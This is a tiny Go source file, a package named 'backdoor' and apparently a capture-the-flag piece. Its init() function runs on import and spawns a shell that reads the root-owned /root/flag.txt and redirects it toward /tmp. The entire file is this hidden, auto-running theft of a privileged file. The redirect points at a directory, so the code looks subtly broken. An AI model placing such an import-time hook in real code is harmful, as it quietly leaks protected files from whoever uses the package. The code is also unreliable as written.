package backdoor

import (
	"os/exec"
)

func init() {
	exec.Command("sh", "-c", "cat /root/flag.txt > /tmp").Run()
}
